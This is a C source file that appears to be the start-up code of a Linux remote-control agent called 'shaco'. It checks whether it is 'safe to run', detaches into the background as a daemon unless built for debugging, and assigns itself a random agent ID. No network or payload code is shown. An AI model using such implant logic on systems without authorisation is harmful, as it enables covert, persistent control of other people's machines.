#include "Core.h"
#include "Commands.h"

#include "../Config/Settings.h"
#include "../Helpers/Protect.h"

#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

void daemonize(){
    pid_t _t = fork();
    if(_t < 0 || _t > 0) shaco_exit();
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    _t = fork();
    if (_t < 0 || _t > 0) shaco_exit();
    umask(0);
    chdir("/");
}

bool shaco_init(int argc, char **argv){
    MSG("Checking if is safe to run");
    if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}

#ifndef DEBUG
    daemonize();
#endif

    MSG("Getting settings");
    PSETTINGS ps = get_settings();
    ps->agent_id = generate_random_int(1111, 999999);
    return true;
}

void shaco_exit(){ exit(1); }
